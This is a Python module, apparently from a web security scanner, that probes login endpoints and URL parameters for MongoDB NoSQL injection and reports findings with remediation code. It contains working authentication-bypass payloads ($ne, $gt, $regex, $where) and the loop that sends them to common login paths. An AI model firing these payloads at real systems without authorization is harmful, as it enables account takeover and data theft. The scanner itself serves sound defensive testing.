"""
NoSQL Injection Detection Module (v1.4.0)
Covers: MongoDB operator injection, authentication bypass, data extraction.

How attackers exploit this:
  Modern apps using MongoDB/CouchDB/Firebase are vulnerable to NoSQL injection
  when user input is passed directly into queries without sanitization.
  Most common: MongoDB operator injection ($gt, $ne, $regex, $where).

Real-world exploits:
  - Login bypass: {"username": {"$ne": ""}, "password": {"$ne": ""}}
  - Data extraction via $regex brute-force
  - JS injection via $where clause (RCE risk)
  
Reference: HackTricks, PortSwigger NoSQL research, CVE-2019-14322
"""

from __future__ import annotations
import json
import re
from typing import List, Optional
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from webshield.core.models import Finding, Severity
from webshield.core.http import get_client


# ─── JSON Body Injection (POST endpoints) ────────────────────────────────────

NOSQL_AUTH_BYPASS_PAYLOADS = [
    # MongoDB $ne (not-equal) bypass
    {"username": {"$ne": ""}, "password": {"$ne": ""}},
    {"username": "admin", "password": {"$ne": ""}},
    {"username": {"$ne": ""}, "password": {"$ne": ""}, "email": {"$ne": ""}},
    # MongoDB $gt bypass
    {"username": {"$gt": ""}, "password": {"$gt": ""}},
    # MongoDB $regex bypass
    {"username": {"$regex": ".*"}, "password": {"$regex": ".*"}},
    # $where (JavaScript execution — severe)
    {"username": {"$where": "1==1"}, "password": {"$where": "1==1"}},
]

# ─── URL Parameter Injection ──────────────────────────────────────────────────

NOSQL_URL_PAYLOADS = [
    # Array-style injection (PHP/Node.js)
    ("[$ne]", ""),
    ("[$gt]", ""),
    ("[$regex]", ".*"),
    # Encoded operator injection
    ("%5B%24ne%5D", ""),
    ("%5B%24gt%5D", ""),
    # Direct operator in value
    ("{$ne:1}", ""),
    ("{$gt:0}", ""),
]

# Signals of successful NoSQL auth bypass
SUCCESS_SIGNALS = [
    "token", "access_token", "dashboard", "welcome", "logged in",
    "auth", "session", "profile", "admin", "\"success\":true",
    '"success": true', "jwt", "bearer",
]

ERROR_SIGNALS = [
    "invalid", "incorrect", "failed", "error", "wrong",
    "unauthorized", "denied", "bad credentials",
]

# MongoDB error patterns
MONGO_ERRORS = [
    re.compile(r"mongodb", re.I),
    re.compile(r"bson", re.I),
    re.compile(r"castError", re.I),
    re.compile(r"MongoError", re.I),
    re.compile(r"mongoose", re.I),
    re.compile(r"\$where", re.I),
    re.compile(r"operator.*not allowed", re.I),
    re.compile(r"unknown operator", re.I),
]

# Login paths to probe
LOGIN_PATHS = [
    "/login", "/signin", "/api/login", "/api/auth", "/api/v1/auth",
    "/api/v1/login", "/auth/login", "/user/login",
]


def _is_login_success(status: int, body: str) -> bool:
    body_lower = body.lower()
    has_success = any(s in body_lower for s in SUCCESS_SIGNALS)
    has_error = any(e in body_lower for e in ERROR_SIGNALS)
    return status in (200,) and has_success and not has_error


def _check_post_nosql(client, base: str, findings: List[Finding]) -> None:
    """Test login endpoints for NoSQL authentication bypass."""
    for path in LOGIN_PATHS:
        login_url = base + path
        try:
            # First, get baseline (wrong credentials)
            baseline_resp = client.post(
                login_url,
                json={"username": "legituser123", "password": "wrongpassword999"},
                headers={"Content-Type": "application/json"},
            )
            if baseline_resp.status_code not in (200, 400, 401, 403, 422):
                continue  # endpoint probably doesn't exist

            for payload in NOSQL_AUTH_BYPASS_PAYLOADS:
                try:
                    resp = client.post(
                        login_url,
                        json=payload,
                        headers={"Content-Type": "application/json"},
                    )

                    # Check for MongoDB error exposure
                    for pattern in MONGO_ERRORS:
                        if pattern.search(resp.text):
                            findings.append(Finding(
                                title=f"NoSQL Injection — MongoDB Error Exposed: {path}",
                                severity=Severity.HIGH,
                                description=(
                                    f"A MongoDB-specific error was triggered at {path} "
                                    "by sending a NoSQL operator payload. The error message "
                                    "reveals database internals and confirms MongoDB usage, "
                                    "aiding further targeted attacks."
                                ),
                                evidence=(
                                    f"Endpoint: {login_url}\n"
                                    f"Payload: {json.dumps(payload)}\n"
                                    f"Error pattern matched: {pattern.pattern}\n"
                                    f"Response: {resp.text[:300]}"
                                ),
                                remediation=(
                                    "Sanitize all inputs before passing to MongoDB queries. "
                                    "Use mongoose schema validation or express-mongo-sanitize. "
                                    "Never expose raw database errors to clients."
                                ),
                                code_fix=(
                                    "# Node.js — use express-mongo-sanitize:\n"
                                    "const mongoSanitize = require('express-mongo-sanitize');\n"
                                    "app.use(mongoSanitize());\n\n"
                                    "# Python / PyMongo — validate input types:\n"
                                    "if not isinstance(username, str):\n"
                                    "    raise ValueError('Username must be a string')\n\n"
                                    "# Django / Mongoengine — use Q objects:\n"
                                    "User.objects(username__exact=username)"
                                ),
                                reference="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection",
                                cvss=7.5,
                            ))
                            return

                    # Check for auth bypass
                    if _is_login_success(resp.status_code, resp.text):
                        is_where = "$where" in str(payload)
                        findings.append(Finding(
                            title=f"NoSQL Injection — Authentication Bypass: {path}",
                            severity=Severity.CRITICAL,
                            description=(
                                f"Authentication bypass via NoSQL injection confirmed at {path}. "
                                f"The payload '{json.dumps(payload)[:80]}' successfully bypassed "
                                "login without valid credentials. Attackers can log in as any user, "
                                "including admin accounts."
                                + (" The $where operator enables JavaScript execution in MongoDB, "
                                   "potentially leading to RCE." if is_where else "")
                            ),
                            evidence=(
                                f"Endpoint: {login_url}\n"
                                f"Bypass payload: {json.dumps(payload)}\n"
                                f"HTTP {resp.status_code} — response suggests successful login\n"
                                f"Response: {resp.text[:300]}"
                            ),
                            remediation=(
                                "Sanitize all query operators from user input. "
                                "Use express-mongo-sanitize or equivalent middleware. "
                                "Validate that username/password are strings before querying. "
                                "Never pass raw request body fields directly to MongoDB."
                            ),
                            code_fix=(
                                "# Node.js — express-mongo-sanitize:\n"
                                "const mongoSanitize = require('express-mongo-sanitize');\n"
                                "app.use(mongoSanitize({ replaceWith: '_' }));\n\n"
                                "# Or manually sanitize:\n"
                                "function sanitize(obj) {\n"
                                "  for (const key of Object.keys(obj)) {\n"
                                "    if (key.startsWith('$')) delete obj[key];\n"
                                "  }\n"
                                "  return obj;\n"
                                "}\n\n"
                                "# Python — validate types:\n"
                                "assert isinstance(username, str), 'username must be string'\n"
                                "assert isinstance(password, str), 'password must be string'"
                            ),
                            reference="https://portswigger.net/web-security/nosql-injection",
                            cvss=9.8 if is_where else 9.1,
                        ))
                        return

                except Exception:
                    continue

        except Exception:
            continue


def _check_url_param_nosql(client, url: str, params: List[str], findings: List[Finding]) -> None:
    """Test URL parameters for array-style NoSQL operator injection."""
    parsed = urlparse(url)

    for param in params[:4]:
        for (suffix, value) in NOSQL_URL_PAYLOADS[:5]:
            injected_param = param + suffix
            test_url_parts = urlparse(url)
            qs = dict(parse_qs(test_url_parts.query, keep_blank_values=True))
            qs[injected_param] = value
            test_url = urlunparse((
                test_url_parts.scheme, test_url_parts.netloc,
                test_url_parts.path, test_url_parts.params,
                urlencode(qs), ""
            ))

            try:
                resp = client.get(test_url)
                for pattern in MONGO_ERRORS:
                    if pattern.search(resp.text):
                        findings.append(Finding(
                            title=f"NoSQL Injection via URL Parameter: {param}{suffix}",
                            severity=Severity.HIGH,
                            description=(
                                f"MongoDB operator injection via URL parameter '{param}{suffix}' "
                                "triggered a database error, confirming the app passes URL parameters "
                                "directly to MongoDB queries. Attackers can bypass filters and extract data."
                            ),
                            evidence=(
                                f"Test URL: {test_url}\n"
                                f"Injected param: {param}{suffix}={value!r}\n"
                                f"MongoDB pattern: {pattern.pattern}\n"
                                f"Response: {resp.text[:200]}"
                            ),
                            remediation=(
                                "Never pass raw query parameters to MongoDB. "
                                "Parse and validate all query params before use. "
                                "Use mongoose or type validation."
                            ),
                            reference="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection",
                            cvss=7.5,
                        ))
                        return
            except Exception:
                continue


def scan(url: str, timeout: float = 12.0) -> List[Finding]:
    findings: List[Finding] = []
    parsed = urlparse(url)
    base = f"{parsed.scheme}://{parsed.netloc}"
    params = list(parse_qs(parsed.query, keep_blank_values=True).keys())

    with get_client(timeout=min(timeout, 10.0)) as client:
        # 1. POST-based auth bypass
        _check_post_nosql(client, base, findings)
        if findings:
            return findings

        # 2. URL parameter injection
        if params:
            _check_url_param_nosql(client, url, params, findings)

    return findings
